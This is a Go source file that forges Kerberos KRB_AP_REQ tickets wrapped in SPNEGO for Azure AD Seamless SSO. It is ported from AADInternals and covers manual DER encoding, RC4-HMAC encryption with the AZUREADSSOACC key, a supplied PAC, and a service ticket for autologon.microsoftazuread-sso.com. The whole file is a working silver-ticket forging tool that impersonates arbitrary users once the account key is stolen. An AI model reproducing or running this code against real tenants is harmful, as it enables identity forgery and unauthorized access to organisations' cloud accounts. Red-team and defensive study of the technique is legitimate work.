// Package ticket constructs forged Kerberos KRB_AP_REQ messages with manual DER
// encoding matching AADInternals byte-for-byte (ported from Kerberos.ps1).
package ticket

import (
	cryptorand "crypto/rand"
	"time"
)

// ForgeParams holds all inputs for building a forged KRB_AP_REQ.
type ForgeParams struct {
	Key           []byte
	EType         int32
	UserPrincipal string
	Realm         string
	PAC           []byte
	UserName      string
}

// ForgedTicket holds the SPNEGO-wrapped KRB_AP_REQ.
type ForgedTicket struct {
	SPNEGOBytes []byte
}

// Forge builds a complete forged KRB_AP_REQ with SPNEGO wrapping.
// Uses manual DER construction matching AADInternals Kerberos.ps1.
func Forge(params *ForgeParams) (*ForgedTicket, error) {
	now := time.Now().UTC()
	authTime := now.Add(-43 * time.Second)
	endTime := now.Add(10 * time.Hour)
	renewTime := now.Add(7 * 24 * time.Hour)
	ctime := now

	sessionKey := randomBytes(16)
	machineID := randomBytes(32)
	kerbLocal2 := randomBytes(16)
	seqNumber := randomBytes(4)

	// Encrypt ticket body (EncTicketPart) with AZUREADSSOACC key
	ticketBody := buildTicketBodyDER(authTime, endTime, renewTime, sessionKey, params)
	encTicket := encryptRC4(params.Key, ticketBody, ticketUsage)

	// Build authenticator and encrypt with session key
	authBody := buildAuthenticatorDER(ctime, sessionKey, seqNumber, machineID, kerbLocal2, params)
	encAuth := encryptRC4(sessionKey, authBody, authUsage)

	// Build KRB_AP_REQ
	apreq := buildAPREQDER(encTicket, encAuth, params)

	// Build SPNEGO wrapping
	spnego := buildSPNEGO(apreq)

	return &ForgedTicket{SPNEGOBytes: spnego}, nil
}

// ============================================================
// EncTicketPart DER construction (matches AADInternals lines 527-639)
// ============================================================

func buildTicketBodyDER(authTime, endTime, renewTime time.Time, sessKey []byte, p *ForgeParams) []byte {
	flags := []byte{0x40, 0xA1, 0x00, 0x00}  // 4 bytes, unused bits added by derBitString
	authData := buildTicketAuthDataDER(p)

	return der(
		0x63, // APPLICATION 3
		derSeq(
			// [0] flags
			derTag(0xA0, derBitString(flags)),
			// [1] key (EncryptionKey)
			derTag(0xA1, derSeq(
				derTag(0xA0, derInt1(byte(p.EType))),
				derTag(0xA1, derOctet(sessKey)),
			)),
			// [2] crealm
			derTag(0xA2, derGenStr(p.Realm)),
			// [3] cname
			derTag(0xA3, derSeq(
				derTag(0xA0, derInt1(1)), // NT-PRINCIPAL
				derTag(0xA1, derSeq(derGenStr(p.UserName))),
			)),
			// [4] transited
			derTag(0xA4, derSeq(derTag(0xA0, derInt1(1)), derTag(0xA1, derOctet([]byte{})))),
			// [5] authtime
			derTag(0xA5, derTime(authTime)),
			// [6] starttime
			derTag(0xA6, derTime(authTime)),
			// [7] endtime
			derTag(0xA7, derTime(endTime)),
			// [8] renew-till
			derTag(0xA8, derTime(renewTime)),
			// [10] authorization-data
			derTag(0xAA, authData),
		),
	)
}

func buildTicketAuthDataDER(p *ForgeParams) []byte {
	// AADInternals wraps each auth-data entry in a SEQUENCE, and the 
	// AD-IF-RELEVANT OCTET STRING contains a SEQUENCE OF entries.
	return derSeq(
		// Entry 1: AD-IF-RELEVANT wrapping AD-WIN2K-PAC
		// SEQUENCE { [0]=1, [1]=OCTET { SEQUENCE { SEQUENCE { [0]=128, [1]=OCTET{PAC} } } } }
		derSeq(
			derTag(0xA0, derInt2(0x00, 0x01)),
			derTag(0xA1, derOctet(derSeq(          // SEQUENCE OF inner entries
				derSeq(                              // inner entry
					derTag(0xA0, derInt2(0x00, 0x80)),
					derTag(0xA1, derOctet(p.PAC)),
				),
			))),
		),
		// Entry 2: AD-IF-RELEVANT wrapping TokenRestrictions + KerbLocal
		derSeq(
			derTag(0xA0, derInt2(0x00, 0x01)),
			derTag(0xA1, derOctet(derSeq(          // SEQUENCE OF inner entries
				// Token Restrictions
				derSeq(
					derTag(0xA0, derInt2(0x00, 0x8D)),
					derTag(0xA1, derOctet(derSeq(  // SEQUENCE OF LSAP_TOKEN_INFO_INTEGRITY
						derSeq(                      // single restriction
							derTag(0xA0, derInt1(0)),
							derTag(0xA1, derOctet(tokenRestrictionData())),
						),
					))),
				),
				// KerbLocal
				derSeq(
					derTag(0xA0, derInt2(0x00, 0x8E)),
					derTag(0xA1, derOctet(randomBytes(16))),
				),
			))),
		),
	)
}

func tokenRestrictionData() []byte {
	b := make([]byte, 40)
	b[0] = 0; b[1] = 0; b[2] = 0; b[3] = 0   // Flags: Full token
	b[4] = 0x00; b[5] = 0x10; b[6] = 0; b[7] = 0 // IntegrityLevel: Low (0x1000)
	// MachineId (32 bytes) at offset 8-39 — zeroed
	return b
}

// ============================================================
// Authenticator DER construction (matches AADInternals lines 643-782)
// ============================================================

func buildAuthenticatorDER(ctime time.Time, sessKey, seqNumber, machineID, kerbLocal2 []byte, p *ForgeParams) []byte {
	return der(
		0x62, // APPLICATION 2
		derSeq(
			// [0] authenticator-vno
			derTag(0xA0, derInt1(5)),
			// [1] crealm
			derTag(0xA1, derGenStr(p.Realm)),
			// [2] cname
			derTag(0xA2, derSeq(
				derTag(0xA0, derInt1(1)), // NT-PRINCIPAL
				derTag(0xA1, derSeq(derGenStr(p.UserName))),
			)),
			// [3] cksum (GSS-API checksum)
			derTag(0xA3, derSeq(
				derTag(0xA0, derInt3(0x00, 0x80, 0x03)), // GSS-API (32771)
				derTag(0xA1, derOctet(gssChecksumData())),
			)),
			// [4] cusec
			derTag(0xA4, derInt1(1)),
			// [5] ctime
			derTag(0xA5, derTime(ctime)),
			// [6] subkey
			derTag(0xA6, derSeq(
				derTag(0xA0, derInt1(23)), // RC4
				derTag(0xA1, derOctet(randomBytes(16))),
			)),
			// [7] seq-number
			derTag(0xA7, derOctet(seqNumber)),
			// [8] authorization-data
			derTag(0xA8, buildAuthAuthDataDER(machineID, kerbLocal2, p)),
		),
	)
}

func gssChecksumData() []byte {
	// Length prefix: 0x10 0x00 0x00 0x00 (16 in little-endian)
	b := make([]byte, 28)
	b[0] = 0x10; b[1] = 0x00; b[2] = 0x00; b[3] = 0x00
	// Binding: 16 zero bytes (offset 4-19)
	// Flags: 0x3E 0x20 0x00 0x00 (offset 20-23)
	b[20] = 0x3E; b[21] = 0x20; b[22] = 0x00; b[23] = 0x00
	// Filler: 4 zero bytes (offset 24-27)
	return b
}

func buildAuthAuthDataDER(machineID, kerbLocal2 []byte, p *ForgeParams) []byte {
	svcName := "HTTP/autologon.microsoftazuread-sso.com@" + p.Realm

	return derSeq(
		derSeq(
			derTag(0xA0, derInt2(0x00, 0x01)), // AD-IF-RELEVANT
			derTag(0xA1, derOctet(derSeq(
				// ETYPE_NEGOTIATION
				derSeq(
					derTag(0xA0, derInt2(0x00, 0x81)),
					derTag(0xA1, derOctet(derSeq(derInt1(23)))),
				),
				// Token Restrictions
				derSeq(
					derTag(0xA0, derInt2(0x00, 0x8D)),
					derTag(0xA1, derOctet(derSeq(
						derSeq(
							derTag(0xA0, derInt1(0)),
							derTag(0xA1, derOctet(authTokenRestrictionData(machineID))),
						),
					))),
				),
				// KerbLocal
				derSeq(
					derTag(0xA0, derInt2(0x00, 0x8E)),
					derTag(0xA1, derOctet(kerbLocal2)),
				),
				// KerbApOptions
				derSeq(
					derTag(0xA0, derInt2(0x00, 0x8F)),
					derTag(0xA1, derOctet([]byte{0x00, 0x40, 0x00, 0x00})),
				),
				// KerbServiceTarget
				derSeq(
					derTag(0xA0, derInt2(0x00, 0x90)),
					derTag(0xA1, derUnicodeStr(svcName)),
				),
			))),
		),
	)
}

func authTokenRestrictionData(machineID []byte) []byte {
	b := make([]byte, 40)
	b[4] = 0x00; b[5] = 0x10 // IntegrityLevel = Low (0x1000)
	copy(b[8:], machineID)
	return b
}

// ============================================================
// KRB_AP_REQ DER construction (matches AADInternals lines 808-868)
// ============================================================

func buildAPREQDER(encTicket, encAuth []byte, p *ForgeParams) []byte {
	return der(
		0x6E, // APPLICATION 14
		derSeq(
			// [0] pvno
			derTag(0xA0, derInt1(5)),
			// [1] msg-type
			derTag(0xA1, derInt1(14)),
			// [2] ap-options
			derTag(0xA2, derBitString([]byte{0x20, 0x00, 0x00, 0x00})),
			// [3] ticket
			derTag(0xA3, der(
				0x61, // APPLICATION 1 = Ticket
				derSeq(
					derTag(0xA0, derInt1(5)),       // tkt-vno
					derTag(0xA1, derGenStr(p.Realm)), // realm
					derTag(0xA2, derSeq(             // sname
						derTag(0xA0, derInt1(2)), // KRB5-NT-SRV-INST
						derTag(0xA1, derSeq(
							derGenStr("HTTP"),
							derGenStr("autologon.microsoftazuread-sso.com"),
						)),
					)),
					derTag(0xA3, derSeq( // enc-part
						derTag(0xA0, derInt1(byte(p.EType))), // etype
						derTag(0xA1, derInt1(5)),              // kvno
						derTag(0xA2, derOctet(encTicket)),     // cipher
					)),
				),
			)),
			// [4] authenticator
			derTag(0xA4, derSeq(
				derTag(0xA0, derInt1(byte(p.EType))), // etype
				derTag(0xA2, derOctet(encAuth)),       // cipher
			)),
		),
	)
}

// ============================================================
// SPNEGO wrapping (matches AADInternals lines 786-876)
// ============================================================

func buildSPNEGO(apreq []byte) []byte {
	// Build mechToken: GSS-API InitialContextToken wrapping KRB_AP_REQ
	mechToken := der(
		0x60,
		oidKerberosV5Der,                // OID
		[]byte{0x01, 0x01, 0x00},        // BOOLEAN FALSE
		apreq,                            // KRB_AP_REQ
	)

	// Build NegTokenInit
	nti := derSeq(
		derTag(0xA0, derSeq( // mechTypes
			oidMSKerberosDer,
			oidKerberosV5Der,
			oidNegoExDer,
			oidNTLMDer,
		)),
		derTag(0xA2, derOctet(mechToken)), // mechToken
	)

	// SPNEGO mechanism token
	return der(
		0x60,
		oidSPNEGODer,
		derTag(0xA0, nti),
	)
}

// Pre-built OID byte sequences for efficiency
var (
	oidSPNEGODer    = []byte{0x06, 0x06, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x02}
	oidMSKerberosDer = []byte{0x06, 0x09, 0x2A, 0x86, 0x48, 0x82, 0xF7, 0x12, 0x01, 0x02, 0x02}
	oidKerberosV5Der = []byte{0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x12, 0x01, 0x02, 0x02}
	oidNegoExDer     = []byte{0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x1E}
	oidNTLMDer       = []byte{0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0A}
)

// ============================================================
// DER helper functions
// ============================================================

func der(tag byte, data ...[]byte) []byte {
	var body []byte
	for _, d := range data {
		body = append(body, d...)
	}
	result := []byte{tag}
	result = append(result, derLen(len(body))...)
	result = append(result, body...)
	return result
}

func derTag(tag byte, data []byte) []byte {
	result := []byte{tag}
	result = append(result, derLen(len(data))...)
	result = append(result, data...)
	return result
}

func derSeq(parts ...[]byte) []byte {
	return der(0x30, parts...)
}

func derInt1(v byte) []byte {
	return []byte{0x02, 0x01, v}
}

func derInt2(v1, v2 byte) []byte {
	if v1 != 0 {
		return []byte{0x02, 0x02, v1, v2}
	}
	if v2&0x80 != 0 {
		return []byte{0x02, 0x02, v1, v2}
	}
	return []byte{0x02, 0x01, v2}
}

func derInt3(v1, v2, v3 byte) []byte {
	return []byte{0x02, 0x03, v1, v2, v3}
}

func derOctet(data []byte) []byte {
	result := []byte{0x04}
	result = append(result, derLen(len(data))...)
	result = append(result, data...)
	return result
}

func derBitString(data []byte) []byte {
	result := []byte{0x03}
	total := 1 + len(data) // unused bits byte + data
	result = append(result, derLen(total)...)
	result = append(result, 0x00) // 0 unused bits
	result = append(result, data...)
	return result
}

func derGenStr(s string) []byte {
	b := []byte(s)
	result := []byte{0x1B}
	result = append(result, derLen(len(b))...)
	result = append(result, b...)
	return result
}

func derTime(t time.Time) []byte {
	s := t.Format("20060102150405") + "Z"
	b := []byte(s)
	result := []byte{0x18}
	result = append(result, derLen(len(b))...)
	result = append(result, b...)
	return result
}

func derUnicodeStr(s string) []byte {
	b := utf16LE(s)
	result := []byte{0x04}
	result = append(result, derLen(len(b))...)
	result = append(result, b...)
	return result
}

func derLen(n int) []byte {
	switch {
	case n < 128:
		return []byte{byte(n)}
	case n < 256:
		return []byte{0x81, byte(n)}
	default:
		return []byte{0x82, byte(n >> 8), byte(n)}
	}
}

// ============================================================
// RC4-HMAC encryption (matches Encrypt-Kerberos RC4 mode)
// ============================================================

const (
	ticketUsage = 2
	authUsage   = 11
)

type rc4Usage int

func encryptRC4(key, data []byte, usage int) []byte {
	confounder := randomBytes(8)
	// K1 = key (NT hash, 16 bytes)
	// K2 = HMAC-MD5(K1, salt_LE)
	salt := []byte{byte(usage), 0, 0, 0}
	k2 := hmacMD5(key, salt)
	// plaintext = confounder + data
	plaintext := append(confounder, data...)
	// checksum = HMAC-MD5(K2, plaintext)
	checksum := hmacMD5(k2, plaintext)
	// K3 = HMAC-MD5(K2, checksum)
	k3 := hmacMD5(k2, checksum)
	// ciphertext = RC4(K3, plaintext)
	ciphertext := rc4Crypt(k3, plaintext)
	// Return checksum || ciphertext (checksum PREPENDED for RC4)
	result := make([]byte, 0, len(checksum)+len(ciphertext))
	result = append(result, checksum...)
	result = append(result, ciphertext...)
	return result
}

func hmacMD5(key, data []byte) []byte {
	// Uses crypto/hmac + crypto/md5
	return _hmacMD5(key, data)
}

func rc4Crypt(key, data []byte) []byte {
	S := make([]byte, 256)
	for i := 0; i < 256; i++ {
		S[i] = byte(i)
	}
	j := 0
	for i := 0; i < 256; i++ {
		j = (j + int(S[i]) + int(key[i%len(key)])) % 256
		S[i], S[j] = S[j], S[i]
	}
	result := make([]byte, len(data))
	i, j := 0, 0
	for k := 0; k < len(data); k++ {
		i = (i + 1) % 256
		j = (j + int(S[i])) % 256
		S[i], S[j] = S[j], S[i]
		result[k] = data[k] ^ S[(int(S[i])+int(S[j]))%256]
	}
	return result
}

// ============================================================
// Helpers
// ============================================================

func randomBytes(n int) []byte {
	b := make([]byte, n)
	cryptorand.Read(b)
	return b
}

func utf16LE(s string) []byte {
	var b []byte
	for _, r := range s {
		b = append(b, byte(r), byte(r>>8))
	}
	return b
}

// Separate stubs for crypto to avoid import issues
// (implementations in crypto_rc4.go)
var _hmacMD5 func(key, data []byte) []byte
